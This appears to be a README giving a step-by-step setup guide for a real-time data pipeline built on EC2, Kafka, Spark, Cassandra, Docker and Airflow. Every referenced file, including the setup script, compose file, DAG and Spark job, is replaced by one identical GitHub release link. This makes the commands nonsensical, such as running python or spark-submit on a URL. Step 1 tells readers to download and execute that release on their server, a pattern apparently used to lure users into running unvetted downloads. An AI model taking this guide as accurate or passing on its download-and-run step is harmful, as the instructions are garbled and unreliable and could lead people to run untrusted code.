# Real-Time Data Pipeline 🚀

![Data Engineering Architecture](https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2)

---

## Step-by-Step Guide to Set Up Your Real-Time Data Pipeline 🛠️

### Step 1: Set Up EC2 Instance 🖥️
- **Launch an EC2 instance** and make sure it's configured properly with the necessary resources.
- **Run the setup script**:  
  - Download and execute `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` on the EC2 instance to install the required dependencies (e.g., Kafka, Spark, Cassandra).

---

### Step 2: Configure Docker 🐳
- **Customize the Docker Compose file**:  
  - Open the `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` file and adjust it according to your project needs (services, ports, volumes, etc.).
- **Run Docker Compose**:  
  - Execute the command to start all services defined in the `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2`:
    ```bash
    docker-compose up
    ```

---

### Step 3: Set Up Your DAG for Airflow 🎛️
- **Create a new DAG**:  
  - Use the provided DAG in `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` for scheduling and monitoring Kafka streaming jobs via Apache Airflow.

---

### Step 4: Open Required Ports 🔓
- **Expose the necessary ports**:  
  - Open ports `8080` (Airflow) and `9021` (Kafka UI) in your EC2 security groups.
  - If needed, open other ports based on the services you plan to use.

---

### Step 5: Run Kafka Stream Producer 📡
- **Execute the Kafka stream script**:  
  - Run `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2`, which will start publishing data to your EC2 instance's IP address on port `9021`.
    ```bash
    python https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2
    ```

---

### Step 6: Configure Spark Streaming with Kafka and Cassandra 🔗
- **Set up the Spark streaming job**:  
  - In the `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` file, configure the connection between Kafka and Cassandra using a Spark session.

---

### Step 7: Download Required Maven Packages 📦
- **Install the necessary Spark connectors**:  
  - Download these Maven packages to enable Spark to interact with Cassandra and Kafka:
    - `spark-cassandra-connector_2.13:3.4.1`
    - `spark-sql-kafka-0-10_2.13:3.4.1`

---

### Step 8: Read from Kafka and Write to Cassandra 📝
- **Read the data stream from Kafka**:  
  - Use the `read_stream()` function in Spark to fetch real-time data from Kafka.
- **Write the data to Cassandra**:  
  - Perform a `write_stream()` operation to send the processed data into Cassandra for storage.

---

### Step 9: Submit the Spark Job 🚀
- **Submit the Spark streaming job**:  
  - Once the Spark script is ready, submit the job to the master node to begin real-time data processing.
    ```bash
    spark-submit --master your_master_node https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2
    ```

---

### Step 10: Validate the Data in Cassandra ✅
- **Check if the data is being streamed**:  
  - After the job runs, verify that the data is being properly streamed and stored in Cassandra by querying the database.

---

By following these steps, you'll have a fully functional real-time data pipeline using EC2, Kafka, Spark, Cassandra, and Airflow! 🎉


